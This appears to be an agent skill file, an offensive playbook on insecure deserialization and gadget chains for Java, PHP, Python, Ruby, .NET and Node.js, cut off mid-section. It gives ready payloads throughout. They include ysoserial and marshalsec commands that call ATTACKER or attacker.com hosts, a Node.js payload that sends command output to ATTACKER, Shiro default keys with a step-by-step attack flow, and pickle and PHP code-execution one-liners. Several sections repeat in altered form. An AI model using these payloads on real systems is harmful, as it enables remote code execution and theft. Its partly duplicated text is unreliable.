---
name: injection-deser
description: >-
  Object-layer injection (deserialization & prototype pollution). Covers Java gadget chains (CC1-CC7/SnakeYAML/Hessian/Shiro), PHP Phar/unserialize, Python pickle, .NET BinaryFormatter/ViewState, Node.js node-serialize, prototype pollution (EJS/child_process/Lodash RCE gadgets), Ghost Bits cast attack (Java char-to-byte WAF bypass), and XXE/LFI (XML External Entity, FTP OOB / XInclude / OOXML / PHP expect://, PHP wrapper LFI). Load when untrusted data is deserialized, object properties are merged, or XML/file paths are attacker-controlled.
---

# Object-Layer Injection — Deserialization & Prototype Pollution

## Internal Navigation
| Part | Content |
|---|---|
| 1 | Insecure Deserialization |
| 2 | Java Gadget Chains |
| 3 | Prototype Pollution |
| 4 | Prototype Pollution Advanced (RCE Gadgets) |
| 5 | Known Gadgets Reference |
| 6 | Ghost Bits Cast Attack |
| 7 | Ghost Bits Payload Cookbook |
| 8 | XML External Entity (XXE) & LFI |

---
# Part 1: Insecure Deserialization


# SKILL: Insecure Deserialization — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert deserialization techniques across Java, PHP, and Python. Covers gadget chain selection, traffic fingerprinting, tool usage (ysoserial, PHPGGC), Shiro/WebLogic/Commons Collections specifics, Phar deserialization, and Python pickle abuse. Base models often miss the distinction between finding the sink and finding a usable gadget chain.

## 0. RELATED ROUTING

- [jndi-injection](../jndi-injection/SKILL.md) when deserialization leads to JNDI lookup (e.g., post-JDK 8u191 bypass via LDAP → deserialization)
- [unauthorized-access-common-services](../unauthorized-access-common-services/SKILL.md) when the deserialization endpoint is an exposed management service (RMI Registry, T3, AJP)
- [ghost-bits-cast-attack](../ghost-bits-cast-attack/SKILL.md) when a WAF blocks your BCEL ClassLoader or Fastjson `@type` payload — Ghost Bits wraps each bytecode byte in a Unicode char whose low 8 bits match, yielding a payload the WAF cannot fingerprint

### Advanced Reference

Also load [JAVA_GADGET_CHAINS.md](./JAVA_GADGET_CHAINS.md) when you need:
- Java gadget chain version compatibility matrix (CommonsCollections 1–7, CommonsBeanutils, Spring, JDK-only, Groovy, Hibernate, ROME, C3P0, etc.)
- SnakeYAML gadget (ScriptEngineManager/URLClassLoader) with exploit JAR structure
- Hessian/Kryo/Avro/XStream deserialization patterns and traffic fingerprints
- .NET ViewState deserialization (machineKey requirement, ViewState forgery with ysoserial.net, Blacklist3r)
- Ruby YAML.load vs YAML.safe_load exploitation with version-specific chains
- Detection fingerprints: magic bytes table by format (Java `AC ED`, .NET `AAEAAD`, Python pickle `80 0N`, PHP `O:`, Ruby `04 08`)


## 1. TRAFFIC FINGERPRINTING — IS IT DESERIALIZATION?

### Java Serialized Objects

| Indicator | Where to Look |
|---|---|
| Hex `ac ed 00 05` | Raw binary in request/response body, cookies, POST params |
| Base64 `rO0AB` | Cookies (`rememberMe`), hidden form fields, JWT claims |
| `Content-Type: application/x-java-serialized-object` | HTTP headers |
| T3/IIOP protocol traffic | WebLogic ports (7001, 7002) |

### PHP Serialized Objects

| Indicator | Where to Look |
|---|---|
| `O:NUMBER:"ClassName"` pattern | POST body, cookies, session files |
| `a:NUMBER:{` (array) | Same locations |
| `phar://` URI usage | File operations accepting user-controlled paths |

### Python Pickle

| Indicator | Where to Look |
|---|---|
| Hex `80 03` or `80 04` (protocol 3/4) | Binary data in requests, message queues |
| Base64-encoded binary blob | API params, cookies, Redis values |
| `pickle.loads` / `pickle.load` in source | Code review / whitebox |

---

## 2. JAVA — GADGET CHAINS AND TOOLS

### ysoserial — Primary Tool

```bash
# Generate payload (example: CommonsCollections1 chain with command)
java -jar ysoserial.jar CommonsCollections1 "curl http://ATTACKER/pwned" > payload.bin

# Base64-encode for HTTP transport
java -jar ysoserial.jar CommonsCollections1 "id" | base64 -w0

# Common chains to try (ordered by frequency of vulnerable dependency):
# CommonsCollections1-7  — Apache Commons Collections 3.x / 4.x
# Spring1, Spring2       — Spring Framework
# Groovy1               — Groovy
# Hibernate1            — Hibernate
# JBossInterceptors1    — JBoss
# Jdk7u21               — JDK 7u21 (no extra dependency)
# URLDNS                — DNS-only confirmation (no RCE, works everywhere)
```

### URLDNS — Safe Confirmation Probe

URLDNS triggers a DNS lookup without RCE — safe for confirming deserialization without damage:

```bash
java -jar ysoserial.jar URLDNS "http://UNIQUE_TOKEN.burpcollaborator.net" > probe.bin
```

DNS hit on collaborator = confirmed deserialization. Then escalate to RCE chains.

### Commons Collections — The Classic Chain

The vulnerability exists when `org.apache.commons.collections` (3.x) is on the classpath and the application calls `readObject()` on untrusted data.

Key classes in the chain: `InvokerTransformer` → `ChainedTransformer` → `TransformedMap` → triggers `Runtime.exec()` during deserialization.

### Apache Shiro — rememberMe Deserialization

Shiro uses AES-CBC to encrypt serialized Java objects in the `rememberMe` cookie.

```text
Known hard-coded keys (SHIRO-550 / CVE-2016-4437):
kPH+bIxk5D2deZiIxcaaaA==          # most common default
wGJlpLanyXlVB1LUUWolBg==          # another common default in older versions
4AvVhmFLUs0KTA3Kprsdag==
Z3VucwAAAAAAAAAAAAAAAA==
```

**Attack flow**:
1. Detect: response sets `rememberMe=deleteMe` cookie on invalid session
2. Generate ysoserial payload (CommonsCollections6 recommended for broad compat)
3. AES-CBC encrypt with known key + random IV
4. Base64-encode → set as `rememberMe` cookie value
5. Send request → server decrypts → deserializes → RCE

**DNSLog confirmation** (before full RCE): use URLDNS chain → `java -jar ysoserial.jar URLDNS "http://xxx.dnslog.cn"` → encrypt → set cookie → check DNSLog for hit.

**Post-fix (random key)**: Key may still leak via padding oracle, or another CVE (SHIRO-721).

### WebLogic Deserialization

Multiple vectors:
- **T3 protocol** (port 7001): direct serialized object injection
- **XMLDecoder** (CVE-2017-10271): XML-based deserialization via `/wls-wsat/CoordinatorPortType`
- **IIOP protocol**: alternative to T3

```bash
# T3 probe — check if T3 is exposed:
nmap -sV -p 7001 TARGET
# Look for: "T3" or "WebLogic" in service banner
```

### Java RMI Registry

RMI Registry (port 1099) accepts serialized objects by design:

```bash
# ysoserial exploit module for RMI:
java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit TARGET 1099 CommonsCollections1 "id"

# Requires: vulnerable library on target's classpath
# Works on: JDK <= 8u111 without JEP 290 deserialization filter
```

### JDK Version Constraints

| JDK Version | Impact |
|---|---|
| < 8u121 | RMI/LDAP remote class loading works |
| 8u121-8u190 | `trustURLCodebase=false` for RMI; LDAP still works |
| >= 8u191 | Both RMI and LDAP remote class loading blocked |
| >= 8u191 bypass | Use LDAP → return serialized gadget object (not remote class) |

---

## 3. PHP — unserialize AND PHAR

### Magic Method Chain

PHP deserialization triggers magic methods in order:

```
__wakeup()  → called immediately on unserialize()
__destruct() → called when object is garbage-collected
__toString() → called when object is used as string
__call()     → called for inaccessible methods
```

**Attack**: craft a serialized object whose `__destruct()` or `__wakeup()` triggers dangerous operations (file write, SQL query, command execution, SSRF).

### Serialized Object Format

```php
O:8:"ClassName":2:{s:4:"prop";s:5:"value";s:4:"cmd";s:2:"id";}
// O:LENGTH:"CLASS":PROP_COUNT:{PROPERTIES}
```

### phpMyAdmin Configuration Injection (Real-World Case)

phpMyAdmin `PMA_Config` class reads arbitrary files via `source` property:

```text
action=test&configuration=O:10:"PMA_Config":1:{s:6:"source";s:11:"/etc/passwd";}
```

### PHPGGC — PHP Gadget Chain Generator

```bash
# List available chains:
phpggc -l

# Generate payload (example: Laravel RCE):
phpggc Laravel/RCE1 system id

# Common chains:
# Laravel/RCE1-10
# Symfony/RCE1-4
# Guzzle/RCE1
# Monolog/RCE1-2
# WordPress/RCE1
# Slim/RCE1
```

### Phar Deserialization

Phar archives contain serialized metadata. Any file operation on a `phar://` URI triggers deserialization — even when `unserialize()` is never directly called.

**Triggering functions** (partial list):
```
file_exists()    file_get_contents()    fopen()
is_file()        is_dir()               copy()
filesize()       filetype()             stat()
include()        require()              getimagesize()
```

**Attack flow**:
1. Upload a valid file (e.g., JPEG with phar polyglot)
2. Trigger file operation: `file_exists("phar://uploads/avatar.jpg")`
3. PHP deserializes phar metadata → gadget chain executes

```bash
# Generate phar with PHPGGC:
phpggc -p phar -o exploit.phar Monolog/RCE1 system id
```

---

## 4. PYTHON — PICKLE

### __reduce__ Method

Python's `pickle.loads()` calls `__reduce__()` on objects during deserialization, which can return a callable + args:

```python
import pickle
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ("id",))

payload = pickle.dumps(Exploit())
# Send payload to target that calls pickle.loads()
```

### Analyzing Pickle Opcodes

```python
import pickletools
pickletools.dis(payload)
# Shows opcodes: GLOBAL, REDUCE, etc.
# Look for GLOBAL referencing dangerous modules (os, subprocess, builtins)
```

### Common Python Deserialization Sinks

```python
pickle.loads(user_data)
pickle.load(file_handle)
yaml.load(data)           # PyYAML without Loader=SafeLoader
jsonpickle.decode(data)
shelve.open(path)
```

### Defensive Bypass: RestrictedUnpickler

Even when `RestrictedUnpickler.find_class` is used, check if the whitelist is too broad:

```python
class RestrictedUnpickler(pickle.Unpickler):
    def find_class(self, module, name):
        if module == "builtins" and name in safe_builtins:
            return getattr(builtins, name)
        raise pickle.UnpicklingError(f"forbidden: {module}.{name}")
```

If `safe_builtins` includes `eval`, `exec`, or `__import__` → still exploitable.

---

## 5. DETECTION METHODOLOGY

```
Found binary blob or encoded object in request/cookie?
├── Java signature (ac ed / rO0AB)?
│   ├── Use URLDNS probe for safe confirmation
│   ├── Identify libraries (error messages, known product)
│   └── Try ysoserial chains matching identified libraries
│
├── PHP signature (O:N:"...)?
│   ├── Identify framework (Laravel, Symfony, WordPress)
│   ├── Try PHPGGC chains for that framework
│   └── Check for phar:// wrapper in file operations
│
├── Python (opaque binary, base64 blob)?
│   ├── Try pickle payload with DNS callback
│   └── Check if PyYAML unsafe load is used
│
└── Not sure?
    ├── Try URLDNS payload (Java) — check DNS
    ├── Try PHP serialized test string
    └── Monitor error messages for class loading failures
```

---

## 6. DEFENSE AWARENESS

| Language | Mitigation |
|---|---|
| Java | JEP 290 deserialization filters; whitelist allowed classes; avoid `ObjectInputStream` on untrusted data; use JSON/Protobuf instead |
| PHP | Avoid `unserialize()` on user input; use `json_decode()` instead; block `phar://` in file operations |
| Python | Use `pickle` only for trusted data; use `json` for external input; PyYAML: always use `yaml.safe_load()` |

---

## 7. QUICK REFERENCE — KEY PAYLOADS

```text
# Java — URLDNS confirmation
java -jar ysoserial.jar URLDNS "http://TOKEN.collab.net"

# Java — RCE via CommonsCollections
java -jar ysoserial.jar CommonsCollections1 "curl http://ATTACKER/pwned"

# PHP — Laravel RCE
phpggc Laravel/RCE1 system "id"

# PHP — Phar polyglot
phpggc -p phar -o exploit.phar Monolog/RCE1 system "id"

# Python — Pickle RCE
python3 -c "import pickle,os;print(pickle.dumps(type('X',(),{'__reduce__':lambda s:(os.system,('id',))})()).hex())"

# Shiro default key test
rememberMe=<AES-CBC(key=kPH+bIxk5D2deZiIxcaaaA==, payload=ysoserial_output)>
```

---

## 8. RUBY DESERIALIZATION

### Ruby Marshal

- `Marshal.load` on untrusted data → RCE
- Fingerprint: binary data, no common text header
- Gadget chains exist for various Ruby versions
- Docker verification: hex payload via `[hex_string].pack("H*")`

### Ruby YAML (YAML.load)

- `YAML.load` (not `YAML.safe_load`) executes arbitrary Ruby objects
- **Pre Ruby 2.7.2**: `Gem::Requirement` chain → `git_set: id` / `git_set: sleep 600`
- **Ruby 2.x-3.x**: `Gem::Installer` → `TarReader` → `Kernel#system` chain (longer, multi-step)
- Always test: `YAML.load("--- !ruby/object:Gem::Installer\ni: x")` for class instantiation check
- Payload template:

```yaml
--- !ruby/object:Gem::Requirement
requirements:
  !ruby/object:Gem::DependencyList
  type: :runtime
  specs:
    - !ruby/object:Gem::StubSpecification
      loaded_from: "|id"
```

- Note: `YAML.safe_load` is safe (Ruby 2.1+); `Psych.safe_load` also safe

---

## 9. .NET DESERIALIZATION

- **Traffic fingerprint**:
  - BinaryFormatter: hex `AAEAAD` (base64 `AAEAAAD/////`)
  - ViewState: hex `FF01` or `/w` prefix
  - JSON.NET: `$type` property in JSON
- **BinaryFormatter** (most dangerous, deprecated in .NET 5+): arbitrary type instantiation
- **XmlSerializer**: `ObjectDataProvider` + `XamlReader` chain for command execution

  ```xml
  <root xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:od="http://schemas.microsoft.com/powershell/2004/04" type="System.Windows.Data.ObjectDataProvider">
    <od:MethodName>Start</od:MethodName>
    <od:MethodParameters><sys:String>cmd</sys:String><sys:String>/c calc</sys:String></od:MethodParameters>
    <od:ObjectInstance xsi:type="System.Diagnostics.Process"/>
  </root>
  ```

- **NetDataContractSerializer**: similar to BinaryFormatter, full type info in XML
- **LosFormatter**: used in ViewState, deserializes to `ObjectStateFormatter`
- **JSON.NET**: `$type` property enables type control → `ObjectDataProvider` + `ExpandedWrapper` chains

  ```json
  {"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"Start","MethodParameters":{"$type":"System.Collections.ArrayList","$values":["cmd","/c calc"]},"ObjectInstance":{"$type":"System.Diagnostics.Process, System"}}
  ```

- **Tool**: `ysoserial.net` — generate payloads for all .NET formatters

  ```text
  ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "calc" -o base64
  ysoserial.exe -f Json.Net -g ObjectDataProvider -c "calc"
  ```

- **POP gadgets**: `ObjectDataProvider`, `ExpandedWrapper`, `AssemblyInstaller.set_Path`

---

## 10. NODE.JS DESERIALIZATION

- **node-serialize**: `unserialize()` with IIFE (Immediately Invoked Function Expression)
  - Payload marker: `_$$ND_FUNC$$_`
  - Add `()` at end to auto-execute:

  ```json
  {"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('COMMAND')}()"}
  ```

- **funcster**: `__js_function` property → `constructor.constructor` to access `process`

  ```json
  {"__js_function":"function(){return global.process.mainModule.require('child_process').execSync('id').toString()}"}
  ```

- **cryo**: similar to funcster, serializes JS objects with function support

---

## RUBY DESERIALIZATION

### Marshal (Binary Format)
```ruby
# Ruby's Marshal.load is equivalent to Java's ObjectInputStream
# Any class with marshal_dump/marshal_load can be a gadget

# Detection: binary data starting with \x04\x08
# Or hex: 0408

# PoC gadget (requires vulnerable class in scope):
payload = "\x04\x08..." # hex-encoded gadget chain
Marshal.load(payload)    # triggers arbitrary code execution
```

### YAML.load (Critical — Most Common Ruby Deser Sink)
```ruby
# YAML.load (NOT YAML.safe_load) deserializes arbitrary Ruby objects

# Ruby <= 2.7.2 — Gem::Requirement chain:
# Triggers via !ruby/object constructor
---
!ruby/object:Gem::Requirement
requirements:
  !ruby/object:Gem::DependencyList
  specs:
    - !ruby/object:Gem::Source
      current_fetch_uri: !ruby/object:URI::Generic
        path: "| id"

# Ruby 2.x–3.x — Gem::Installer chain:
# Uses Gem::Installer → Gem::StubSpecification → Kernel#system
---
!ruby/hash:Gem::Installer
i: x
!ruby/hash:Gem::SpecFetcher
i: y
!ruby/object:Gem::Requirement
requirements:
  !ruby/object:Gem::Package::TarReader
  io: &1 !ruby/object:Net::BufferedIO
    io: &1 !ruby/object:Gem::Package::TarReader::Entry
      read: 0
      header: "abc"
    debug_output: &1 !ruby/object:Net::WriteAdapter
      socket: &1 !ruby/object:Gem::RequestSet
        sets: !ruby/object:Net::WriteAdapter
          socket: !ruby/module 'Kernel'
          method_id: :system
        git_set: id    # <-- command to execute
      method_id: :resolve

# Safe alternative: YAML.safe_load (whitelist of allowed types)
```

### Tools
- `elttam/ruby-deserialization` — Ruby gadget chain generator
- `frohoff/ysoserial` inspiration → check Ruby-specific forks

---

## .NET DESERIALIZATION

### Traffic Fingerprinting

| Indicator | Serializer |
|---|---|
| Hex `00 01 00 00 00` / Base64 `AAEAAD` | BinaryFormatter |
| Hex `FF 01` / Base64 `/w` | DataContractSerializer |
| ViewState starts with `__VIEWSTATE` | LosFormatter / ObjectStateFormatter |
| JSON with `$type` property | JSON.NET (Newtonsoft) TypeNameHandling |
| XML with `<ObjectDataProvider>` | XmlSerializer / NetDataContractSerializer |

### BinaryFormatter / LosFormatter
```
# Most dangerous — arbitrary type instantiation
# Tool: ysoserial.net

ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "calc.exe" -o base64
ysoserial.exe -g TextFormattingRunProperties -f BinaryFormatter -c "cmd /c whoami > C:\\out.txt" -o base64

# LosFormatter wraps BinaryFormatter — same gadgets work
ysoserial.exe -g TypeConfuseDelegate -f LosFormatter -c "calc.exe" -o base64
```

### XmlSerializer + ObjectDataProvider
```xml
<root>
  <ObjectDataProvider MethodName="Start" xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation">
    <ObjectDataProvider.MethodParameters>
      <sys:String xmlns:sys="clr-namespace:System;assembly=mscorlib">cmd.exe</sys:String>
      <sys:String xmlns:sys="clr-namespace:System;assembly=mscorlib">/c whoami</sys:String>
    </ObjectDataProvider.MethodParameters>
    <ObjectDataProvider.ObjectInstance>
      <ProcessStartInfo xmlns="clr-namespace:System.Diagnostics;assembly=System">
        <ProcessStartInfo.FileName>cmd.exe</ProcessStartInfo.FileName>
        <ProcessStartInfo.Arguments>/c whoami</ProcessStartInfo.Arguments>
      </ProcessStartInfo>
    </ObjectDataProvider.ObjectInstance>
  </ObjectDataProvider>
</root>
```

### JSON.NET with TypeNameHandling
```json
{
  "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework",
  "MethodName": "Start",
  "MethodParameters": {
    "$type": "System.Collections.ArrayList, mscorlib",
    "$values": ["cmd.exe", "/c whoami"]
  },
  "ObjectInstance": {
    "$type": "System.Diagnostics.Process, System"
  }
}
```
Vulnerable when `TypeNameHandling` is set to `Auto`, `Objects`, `Arrays`, or `All`.

### Tools
- `pwntester/ysoserial.net` — primary .NET deserialization payload generator
- Gadget chains: TypeConfuseDelegate, TextFormattingRunProperties, PSObject, ActivitySurrogateSelectorFromFile

---

## NODE.JS DESERIALIZATION

### node-serialize (IIFE Pattern)
```javascript
// node-serialize uses eval() internally
// Payload uses _$$ND_FUNC$$_ marker + IIFE:

var payload = '{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'id\',function(error,stdout,stderr){console.log(stdout)});}()"}';

// The trailing () makes it an Immediately Invoked Function Expression
// When unserialize() processes this, it executes the function

// Full HTTP exploit (in cookie or body):
{"username":"_$$ND_FUNC$$_function(){require('child_process').exec('curl http://ATTACKER/?x=$(id|base64)',function(e,o,s){});}()","email":"test@test.com"}
```

### funcster
```javascript
// funcster deserializes functions via constructor.constructor pattern:
{"__js_function":"function(){var net=this.constructor.constructor('return require')()('child_process');return net.execSync('id').toString();}"}
```

### PHP create_function + Deserialization Combo
```php
// When a PHP class uses create_function in __destruct or __wakeup:
// Serialize an object where:
$a = "create_function";
$b = ";}system('id');/*";
// The lambda body becomes: function(){ ;}system('id');/* }
// Closing the original function body and injecting a command

// In serialized form, private properties need \0ClassName\0 prefix:
O:7:"Noteasy":2:{s:19:"\0Noteasy\0method_name";s:15:"create_function";s:14:"\0Noteasy\0args";s:21:";}system('id');/*";}
```

---

## 11. RUBY DESERIALIZATION

### Marshal
```ruby
# Ruby's native serialization. Dangerous when deserializing untrusted data.
# Detection: Binary data starting with \x04\x08

# One-liner gadget verification (hex-encoded payload):
payload = ["040802"].pack("H*")  # Minimal Marshal header
Marshal.load(payload)
```

### YAML (CVE-rich surface)
```ruby
# YAML.load is DANGEROUS — equivalent to eval for Ruby objects
# Safe alternative: YAML.safe_load

# Ruby <= 2.7.2: Gem::Requirement chain
--- !ruby/object:Gem::Requirement
requirements:
  - !ruby/object:Gem::DependencyList
    specs:
    - !ruby/object:Gem::Source
      uri: "| id"

# Ruby 2.x-3.x: Gem::Installer chain (more complex)
# Triggers: git_set → Kernel#system
--- !ruby/object:Gem::Installer
i: x
# (Full chain available in ysoserial-ruby / blind-ruby-deserialization)

# Universal detection: supply YAML that triggers DNS callback
--- !ruby/object:Gem::Fetcher
uri: http://BURP_COLLAB/
```

**Tools**: `elttam/ruby-deserialization`, `mbechler/ysoserial` (Ruby variant)

---

## 12. .NET DESERIALIZATION

### Fingerprinting
| Magic Bytes | Format |
|---|---|
| `AAEAAD` (base64) / `00 01 00 00 00` (hex) | BinaryFormatter |
| `FF 01` or `/w` (base64) | ViewState (ObjectStateFormatter) |
| `<` (XML opening) | XmlSerializer / DataContractSerializer |
| JSON with `$type` key | JSON.NET (TypeNameHandling enabled) |

### BinaryFormatter (most dangerous)
```
# Always dangerous when deserializing untrusted data
# Tool: ysoserial.net
ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "whoami" -o base64
ysoserial.exe -f BinaryFormatter -g WindowsIdentity -c "calc" -o raw
```

### ViewState (ASP.NET)
```
# If __VIEWSTATE is not MAC-protected (enableViewStateMac=false):
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "cmd /c whoami" --validationalg="SHA1" --validationkey="KNOWN_KEY"

# Leak machineKey from web.config (via LFI/backup) → forge ViewState
```

### XmlSerializer + ObjectDataProvider
```xml
<root xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" 
      xmlns:xsd="http://www.w3.org/2001/XMLSchema">
  <ObjectDataProvider MethodName="Start">
    <ObjectInstance xsi:type="Process">
      <StartInfo>
        <FileName>cmd.exe</FileName>
        <Arguments>/c whoami</Arguments>
      </StartInfo>
    </ObjectInstance>
  </ObjectDataProvider>
</root>
```

### JSON.NET ($type abuse)
```json
{
  "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework",
  "MethodName": "Start",
  "ObjectInstance": {
    "$type": "System.Diagnostics.Process, System",
    "StartInfo": {
      "$type": "System.Diagnostics.ProcessStartInfo, System",
      "FileName": "cmd.exe",
      "Arguments": "/c whoami"
    }
  }
}
```
Vulnerable when `TypeNameHandling != None` in JSON deserialization settings.

### Tools
- `pwntester/ysoserial.net` — primary .NET gadget chain generator
- `NotSoSecure/Blacklist3r` — decrypt/forge ViewState with known machineKey

---

## 13. NODE.JS DESERIALIZATION

### node-serialize (IIFE injection)
```javascript
// Vulnerable pattern:
var serialize = require('node-serialize');
var obj = serialize.unserialize(userInput);

// Payload: IIFE (Immediately Invoked Function Expression)
// The _$$ND_FUNC$$_ prefix signals a serialized function
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id',function(error,stdout,stderr){console.log(stdout)})}()"}

// Key: the () at the end causes immediate execution upon deserialization
```

### funcster
```javascript
// Vulnerable: funcster.deepDeserialize(userInput)
// Payload uses __js_function to inject via constructor chain:
{"__js_function":"function(){var net=this.constructor.constructor('return this')().process.mainModule.require('child_process');return net.execSync('id').toString()}()"}
```

### PHP create_function + Deserialization Combo
```php
// When create_function is available and object is deserialized:
// Payload creates lambda with injected code:
$a = "create_function";
$b = ";}system('id');/*";
// The lambda body becomes: function anonymous() { ;}system('id');/* }
// Effective: close original body, inject command, comment out rest

// In serialized form (with private property \0ClassName\0):
O:8:"ClassName":2:{s:13:"\0ClassName\0func";s:15:"create_function";s:12:"\0ClassName\0arg";s:18:";}system('id');/*";}
```


---
# Part 2: Java Gadget Chains


## 1. JAVA GADGET CHAIN VERSION COMPATIBILITY MATRIX

### 1.1 CommonsCollections Chains

| Chain | Library | Version Range | JDK Constraint | Execution Type |
|---|---|---|---|---|
| **CC1** | Commons Collections 3.x | 3.0–3.2.1 | JDK < 8u72 (InvokerTransformer filter) | `Runtime.exec()` |
| **CC2** | Commons Collections 4.x | 4.0 | None (uses `TemplatesImpl`) | Bytecode execution |
| **CC3** | Commons Collections 3.x | 3.0–3.2.1 | JDK < 8u72 | `TemplatesImpl` (bytecode) |
| **CC4** | Commons Collections 4.x | 4.0 | None | `TemplatesImpl` |
| **CC5** | Commons Collections 3.x | 3.0–3.2.1 | JDK ≥ 8 OK (no `InvokerTransformer` check needed) | `Runtime.exec()` via `TiedMapEntry` |
| **CC6** | Commons Collections 3.x | 3.1–3.2.1 | All JDK versions | `Runtime.exec()` via `HashSet` trigger |
| **CC7** | Commons Collections 3.x | 3.1–3.2.1 | All JDK versions | `Runtime.exec()` via `Hashtable` |

**Recommended priority**: CC6 → CC7 → CC5 (broadest compatibility, no JDK version constraint).

### 1.2 CommonsBeanutils Chains

| Chain | Library | Version Range | Notes |
|---|---|---|---|
| **CB1** | Commons BeanUtils 1.x + Commons Collections 3.x | BU 1.6.1–1.9.4, CC ≤ 3.2.1 | `PropertyUtils.getProperty` → `TemplatesImpl` |
| **CB1 (no-CC)** | Commons BeanUtils 1.x only | BU 1.8.3–1.9.4 | Requires `commons-logging`; no CC dependency |

### 1.3 Spring Framework Chains

| Chain | Library | Version Range | Notes |
|---|---|---|---|
| **Spring1** | Spring Core + Spring Beans | 4.1.4 (known), varies | `MethodInvokeTypeProvider` → `TemplatesImpl` |
| **Spring2** | Spring Core | 4.1.4 | `ObjectFactoryDelegatingInvocationHandler` |

### 1.4 JDK-Only Chains (No External Dependencies)

| Chain | JDK Version | Notes |
|---|---|---|
| **Jdk7u21** | JDK 7u21 | `AnnotationInvocationHandler` + `TemplatesImpl`; patched in 7u25 |
| **JRMPClient** | All | Triggers JRMP call to attacker RMI server (not direct RCE, but enables chaining) |
| **JRMPListener** | All | Opens RMI listener on victim (less useful) |
| **URLDNS** | All | DNS-only; confirmation probe, no RCE |

### 1.5 Other Notable Chains

| Chain | Library | Notes |
|---|---|---|
| **Groovy1** | Groovy 1.7–2.4 | `MethodClosure` + `ConvertedClosure` |
| **Hibernate1** | Hibernate 5.x (with `javassist` or `cglib`) | `BasicLazyInitializer` → `TemplatesImpl` |
| **Hibernate2** | Hibernate 5.x | Via `AbstractComponentTuplizer` |
| **JBossInterceptors1** | JBoss Interceptors + weld-core | Rarely seen in modern apps |
| **Myfaces1** | Apache MyFaces 1.x | `ViewState` deserialization |
| **Myfaces2** | Apache MyFaces 2.x | `ViewState` deserialization |
| **ROME** | ROME 1.0 | `ObjectBean` → `EqualsBean` → `ToStringBean` |
| **Vaadin1** | Vaadin framework | `PropertysetItem` chain |
| **Wicket1** | Apache Wicket | Requires specific classpath setup |
| **C3P0** | C3P0 connection pool | `PoolBackedDataSource` → JNDI or URL classloading |
| **Clojure** | Clojure runtime | `core$fn` → arbitrary function execution |
| **BeanShell1** | BeanShell 2.x | `XThis` + `Interpreter.eval()` |
| **Jython1** | Jython | `PyFunction` → arbitrary Python execution in JVM |
| **MozillaRhino1/2** | Mozilla Rhino JS engine | `NativeJavaObject` chains |

### 1.6 Chain Selection Decision Tree

```
Identify target libraries (error messages, pom.xml, /META-INF/MANIFEST.MF):
├── Commons Collections 3.x on classpath?
│   ├── JDK < 8u72 → CC1, CC3
│   └── JDK ≥ 8u72 → CC5, CC6, CC7
├── Commons Collections 4.x?
│   └── CC2, CC4
├── Commons BeanUtils?
│   └── CB1 (with or without CC)
├── Spring Framework?
│   └── Spring1, Spring2
├── Groovy?
│   └── Groovy1
├── Hibernate + javassist/cglib?
│   └── Hibernate1, Hibernate2
├── No external libs identified?
│   ├── Try URLDNS first (confirmation)
│   ├── JDK 7u21 → Jdk7u21
│   └── JRMPClient → chain to RMI server with full gadget
└── Unknown? Try CC6, then CB1, then URLDNS
```


## 2. SNAKEYAML GADGET

### 2.1 Concept

SnakeYAML (Java YAML parser) supports constructing arbitrary Java objects via `!!` tag. When `Yaml.load()` is called on untrusted input without `SafeConstructor`, it instantiates any class.

### 2.2 ScriptEngineManager / URLClassLoader

```yaml
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://attacker.com/exploit.jar"]
  ]]
]
```

**Exploit flow**:
1. SnakeYAML constructs `URLClassLoader` pointing to attacker JAR
2. Constructs `ScriptEngineManager` using that classloader
3. `ScriptEngineManager` uses `ServiceLoader` → loads `META-INF/services/javax.script.ScriptEngineFactory`
4. Attacker's JAR contains malicious `ScriptEngineFactory` implementation → RCE

**Attacker JAR structure**:
```
exploit.jar/
├── META-INF/
│   └── services/
│       └── javax.script.ScriptEngineFactory → "Exploit"
└── Exploit.class  (implements ScriptEngineFactory, executes commands in static block)
```

### 2.3 SPI-Based Variants

```yaml
# ProcessBuilder (direct command execution, Java 9+):
!!sun.misc.Service [
  !!java.lang.ProcessBuilder [["curl", "http://attacker.com/pwned"]]
]

# Alternative URLClassLoader form:
!!java.beans.XMLDecoder
  <java>
    <object class="java.lang.Runtime" method="getRuntime">
      <void method="exec"><string>calc</string></void>
    </object>
  </java>
```

### 2.4 Detection

```
# Indicators in HTTP traffic:
- Content-Type: application/x-yaml
- Content-Type: text/yaml
- YAML content with !! tags in POST body, file uploads, config endpoints
- Spring Cloud Config Server endpoints accepting YAML

# Test probe (DNS-based safe detection):
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://UNIQUE.burpcollaborator.net/probe"]
  ]]
]
```

---

## 3. HESSIAN / KRYO / AVRO DESERIALIZATION

### 3.1 Hessian

Caucho Hessian is a binary web-service protocol. Hessian's `HessianInput.readObject()` can deserialize arbitrary Java objects.

```
# Traffic fingerprint:
- Content-Type: x-application/hessian
- Content-Type: application/x-hessian
- Binary starting with: 'c' (call), 'H' (Hessian 2.0), 'r' (reply)
- URL patterns: /hessian, /remoting/*, /service/*

# Known vulnerable configurations:
- Spring Remoting with HessianServiceExporter
- Resin application server (Caucho)
- Dubbo RPC framework (Apache)
```

**Hessian gadget chains** (via `marshalsec` tool):

```bash
# Generate Hessian payload:
java -cp marshalsec.jar marshalsec.Hessian \
  SpringPartiallyComparableAdvisorHolder \
  "ldap://attacker.com:1389/Exploit"

# Hessian2 variant:
java -cp marshalsec.jar marshalsec.Hessian2 \
  SpringAbstractBeanFactoryPointcutAdvisor \
  "ldap://attacker.com:1389/Exploit"
```

**Common Hessian gadgets**:
